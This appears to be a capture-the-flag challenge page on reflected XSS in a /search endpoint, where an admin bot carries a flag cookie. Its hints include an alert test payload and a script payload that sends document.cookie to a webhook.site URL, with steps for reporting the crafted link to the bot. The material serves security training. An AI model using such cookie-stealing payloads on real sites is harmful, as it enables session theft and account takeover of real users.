Description

The /search endpoint reflects your q= query parameter directly into the page HTML — no encoding, no sanitisation.


An Admin Bot visits reported URLs every 30 seconds with the flag cookie set in its browser.


Craft an XSS payload that exfiltrates document.cookie to a webhook, then report that URL to the bot.

Hints

💡 HINT 1 −25 pts ▼ Reveal
Confirm XSS first. Try this in the search box:

<script>alert(1)</script>

If a popup appears, the page is vulnerable.
💡 HINT 2 −50 pts ▼ Reveal
Use document.cookie to steal the cookie and send it to a webhook:

<script>fetch('https://webhook.site/YOUR-ID?c='+document.cookie)</script>

Replace YOUR-ID with your real webhook.site ID.
💡 HINT 3 −75 pts ▼ Reveal
URL-encode your full payload and submit it as the report URL.

The bot will visit:
/search?q=<script>fetch(...)</script>

It will execute the script in its browser context where document.cookie contains the flag.
